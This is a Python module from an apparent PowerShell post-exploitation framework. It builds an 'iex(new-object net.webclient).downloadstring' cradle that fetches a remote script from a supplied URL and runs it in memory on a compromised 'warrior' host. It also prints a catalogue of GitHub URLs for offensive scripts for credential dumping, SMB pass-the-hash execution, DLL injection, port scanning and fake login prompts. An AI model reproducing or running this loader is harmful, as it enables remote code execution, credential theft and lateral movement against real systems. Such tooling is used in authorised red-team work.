from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Loader Ext",
                       "Description": "Load any function (GitHub RAW Repository)",
                       "Author": "@pablogonzalezpe, @josueencinar"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "url": [None, "RAW URL Github Repo", False],
                    "option": ["1", "1 > Run, 2 > Show catalog, 3 > show functions loaded in memory", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)
    
    def show_catalog(self):
        cprint("Powershell Guide Post-Exploitation", "yellow")
        cprint("==================================", "yellow")
        print(" ")
        cprint("-> Invoke-PowerDump - https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1 - Posh-SecMod & Empire Project", "yellow")
        cprint("-> Invoke-SMBExec - https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1 - Kevin Robertson", "yellow")
        cprint("-> Invoke-DLLInjection - https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1 - Matthew Graeber", "yellow")
        cprint("-> Invoke-Portscan - https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1 - Rich Lundeen", "yellow")
        cprint("-> Invoke-LoginPrompt - https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1 - Matt Nelson (@enigma0x3)", "yellow")

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        op = self.args["option"]
        call = False
        if op == "1":
            if not self.args["url"]:
                cprint("URL required for option 1", "red")
                return
            function = 'iex(new-object net.webclient).downloadstring("{}")'.format(self.args["url"])
            call = True
        elif op == "2":
            self.show_catalog()
        elif op == "3":
            function = """function getNewMemoryFunctions{
                            $ps_clean = powershell.exe -C "(ls function:).Name"
                            $ps_warrior = (ls function:).Name

                            $data =  ""
                        
                            foreach($name in $ps_warrior){ 
                                if(-not($ps_clean.contains($name))){
                                    $data = $data + $name + "`n"
                                }
                            }
                            return $data
                        }
            """
            function += "getNewMemoryFunctions;"
            call = True
        else:
            cprint("Invalid option: 1 > Run, 2 > Show catalog, 3 > show functions loaded in memory", "red")

        if call:
            super(CustomModule, self).run(function)
